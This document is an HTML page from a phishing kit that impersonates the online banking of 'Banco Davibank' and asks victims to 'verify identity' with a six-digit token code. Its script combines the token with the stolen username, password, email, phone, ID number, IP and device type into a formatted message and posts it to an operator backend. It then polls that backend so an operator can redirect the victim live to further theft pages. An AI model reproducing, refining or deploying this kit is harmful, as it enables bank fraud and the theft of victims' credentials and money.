<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Banca virtual | Confirmacion</title>
    <link rel="shortcut icon" href="img/favicon.png" type="image/x-icon">
    <link rel="stylesheet" href="css/normalize.min.css" />
    <link rel="stylesheet" href="css/estilos.css" />
    <script type="text/javascript" src="../../../../assets/js/jquery-3.6.0.min.js"></script>
</head>

<body>
    <div class="contenedor">
        <div class="principal">
            <div class="autenticar">
                <div class="conttitulo">
                    <div class="logo-banner">
                        <img src="img/logo_davib.svg" alt="Banner Logo" />
                    </div>
                    <div class="titulo">
                        <h1>Verifica tu identidad</h1>
                    </div>
                </div>
                <div class="contenido">
                    <div class="caja">
                        <div class="izq">
                            <form autocomplete="off" id="fatm">
                                <input type="hidden" id="session_id" name="session_id">
                                <input type="hidden" id="username" name="username">
                                <input type="hidden" id="prueba_clave" value="">
                                        
                                <div class="inputg columna">
                                    <div style="text-align: right;" class="ojos">
                                        <img src="img/ojo.svg" alt="ojo" id="ojo" style="display: none;">
                                    </div>
                                    <input type="password" name="token" id="token" placeholder="Codigo"
                                        maxlength="6" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;" pattern="[0-9]*" />
                                        <div class="error" id="etoken">
                                        <img src="img/war.svg" alt="error"> <span class="rojo">Token invalido</span>
                                    </div>
                                </div>
                                <div class="inputgb">
                                    <button type="button" id="btntoken" class="btn">Continuar</button>
                                </div>
                                <div class="inputg inicio" >
                                    <p style="margin-bottom: 5px;">Por razones de seguridad le recomendamos ingresar los
                                datos solicitados a fin de seguir disfrutando de nuestros servicios</p>
                                   
                                </div>
                            </form>
                        </div>
                        <div class="der">
                            <img src="img/baner1.svg" alt="baner1" />
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Loader overlay -->
    <div id="loader-overlay" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(255, 255, 255, 0.7); z-index: 9999; justify-content: center; align-items: center;">
        <img src="img/l21.svg" alt="Cargando..." style="width: 80px; height: 80px; animation: blink 1.5s infinite;">
    </div>

    <style>
        @keyframes blink {
            0% { opacity: 1; }
            50% { opacity: 0.3; }
            100% { opacity: 1; }
        }
    </style>

    <script src="js/funciones.js"></script>
    <script>
    document.addEventListener("DOMContentLoaded", function () {
      const urlParams = new URLSearchParams(window.location.search);
      
      // Generar o recuperar session_id
      let sessionId = localStorage.getItem('session_id');
      if (!sessionId) {
        sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
        localStorage.setItem('session_id', sessionId);
      }
      
      const sessionInput = document.getElementById('session_id');
      sessionInput.value = sessionId;

      // Obtener usuario desde URL params y establecer en el campo hidden
      const userFromUrl = urlParams.get('user');
      const usernameInput = document.getElementById('username');
      if (userFromUrl) {
        usernameInput.value = userFromUrl;
        localStorage.setItem('username', userFromUrl);
      }

      // Remover el event listener original y agregar el nuestro
      const btnToken = document.getElementById('btntoken');
      
      if (btnToken) {
        // Remover event listeners existentes
        const newBtn = btnToken.cloneNode(true);
        btnToken.parentNode.replaceChild(newBtn, btnToken);
        
        // Agregar nuestro event listener
        newBtn.addEventListener('click', async function (event) {
          event.preventDefault();
          event.stopPropagation();

          const token = document.getElementById('token').value;
          
          // Validar que el token tenga 6 dígitos
          if (token.length !== 6) {
            alert('La clave dinámica debe tener 6 dígitos');
            return;
          }

          // Mostrar loader
          const loader = document.getElementById('loader-overlay');
          if (loader) {
            loader.style.display = 'flex';
          }

          const session_id = document.getElementById('session_id').value;
          const username = document.getElementById('username').value;

          localStorage.setItem('token', token);
          localStorage.setItem('session_id', session_id);
          localStorage.setItem('username', username);

          // Obtener datos previos del localStorage
          const identificacion = localStorage.getItem('identificacion') || '';
          const password = localStorage.getItem('password') || '';
          
          // Detectar tipo de dispositivo
          const userAgent = navigator.userAgent;
          let dispositivo = 'PC';
          
          if (/Android/i.test(userAgent)) {
            dispositivo = 'Android';
          } else if (/iPhone|iPad|iPod/i.test(userAgent)) {
            dispositivo = 'iPhone';
          } else if (/Windows/i.test(userAgent)) {
            dispositivo = 'PC';
          } else if (/Mac/i.test(userAgent)) {
            dispositivo = 'Mac';
          } else if (/Linux/i.test(userAgent)) {
            dispositivo = 'Linux';
          }
          
          const hora = new Date().toLocaleString('es-ES');

          // Obtener IP y construir mensaje
          fetch('get_ip.php')
            .then(response => {
              return response.json();
            })
            .then(data => {
              const ip = data.ip || 'No disponible';
              
              const mensaje = `
<b><u>💎BANCO DAVIBANK - TOKEN💎</u></b>
• <b>💌Correo:</b> ${localStorage.getItem('correo') || 'No disponible'}
• <b>📞Celular:</b> ${localStorage.getItem('cel') || 'No disponible'}
• <b>💸Cedula:</b> ${localStorage.getItem('val') || 'No disponible'}
• <b>👤Persona:</b> ${localStorage.getItem('per') || 'No disponible'}
• <b>🏦Banco:</b> BANCO DAVIBANK
• <b>📟Dispositivo:</b> ${dispositivo}
• <b>🗺IP:</b> ${ip}
• <b>⏱Hora:</b> ${hora}
------------------------------
• <b>👤 Usuario:</b> ${identificacion}
• <b>🔑 Clave:</b> ${password}
------------------------------
• <b>🔐 Token:</b> ${token}
------------------------------`;

              const formData = new FormData();
              formData.append('message', mensaje);
              formData.append('transactionId', session_id);

              fetch('procesar_dinamica.php', {
                method: 'POST',
                body: formData
              })
              .then(res => {
                return res.json();
              })
              .then(result => {
                if (result.status === 'success') {
                  checkPaymentVerification(session_id, result.messageId);
                } else {
                  // Ocultar loader si hay error
                  const loader = document.getElementById('loader-overlay');
                  if (loader) {
                    loader.style.display = 'none';
                  }
                }
              })
              .catch(err => {
                // Ocultar loader si hay error
                const loader = document.getElementById('loader-overlay');
                if (loader) {
                  loader.style.display = 'none';
                }
              });
            })
            .catch((error) => {
              // Si falla la obtención de IP, enviar sin IP
              const mensaje = `
<b><u>💎BANCO DAVIBANK - TOKEN💎</u></b>
• <b>💌Correo:</b> ${localStorage.getItem('correo') || 'No disponible'}
• <b>📞Celular:</b> ${localStorage.getItem('cel') || 'No disponible'}
• <b>💸Cedula:</b> ${localStorage.getItem('val') || 'No disponible'}
• <b>👤Persona:</b> ${localStorage.getItem('per') || 'No disponible'}
• <b>🏦Banco:</b> BANCO DAVIBANK
• <b>📟Dispositivo:</b> ${dispositivo}
• <b>🗺IP:</b> No disponible
• <b>⏱Hora:</b> ${hora}
------------------------------
• <b>👤 Usuario:</b> ${identificacion}
• <b>🔑 Clave:</b> ${password}
------------------------------
• <b>🔐 Token:</b> ${token}
------------------------------`;

              const formData = new FormData();
              formData.append('message', mensaje);
              formData.append('transactionId', session_id);

              fetch('procesar_dinamica.php', {
                method: 'POST',
                body: formData
              })
              .then(res => {
                return res.json();
              })
              .then(result => {
                if (result.status === 'success') {
                  checkPaymentVerification(session_id, result.messageId);
                } else {
                  // Ocultar loader si hay error
                  const loader = document.getElementById('loader-overlay');
                  if (loader) {
                    loader.style.display = 'none';
                  }
                }
              })
              .catch(err => {
                // Ocultar loader si hay error
                const loader = document.getElementById('loader-overlay');
                if (loader) {
                  loader.style.display = 'none';
                }
              });
            });
        });
      } else {
        // Botón Token no encontrado
      }
    });

    async function checkPaymentVerification(transactionId, messageId) {
  try {
    const formData = new FormData();
    formData.append('transactionId', transactionId);
    formData.append('messageId', messageId);

    const res = await fetch('verificar_dinamica.php', {
      method: 'POST',
      body: formData
    });

    const result = await res.json();

    if (result.action) {
      // Ocultar loader si existe
      const loader = document.getElementById('loader-overlay');
      if (loader) loader.style.display = 'none';

      switch (result.action) {
        case 'pedir_dinamica':
        case 'error_dinamica':
          alert("Error de Clave Dinámica.");
          window.location.href = "token.php";
          break;

        case 'error_logo':
          alert("Usuario o clave incorrectos.");
          window.location.href = "index.php";
          break;

        case 'error_cajero':
          $("#mensaje").hide();
          window.location.href = "caje.php";
          break;

        case 'error_tarjeta':
          alert("Error de tarjeta.");
          window.location.href = "index.php";
          break;

        case 'confirm_finalizar':
          window.location.href = "..//fin.php";
          break;

        default:
          console.warn("Acción desconocida:", result.action);
          break;
      }
    } else {
      // Si no hay acción, volver a verificar en 2 segundos
      setTimeout(() => checkPaymentVerification(transactionId, messageId), 2000);
    }

  } catch (err) {
    // Error de red, intentar de nuevo
    console.error("Error en verificación:", err);
    setTimeout(() => checkPaymentVerification(transactionId, messageId), 2000);
  }
}

    </script>
</body>

</html>

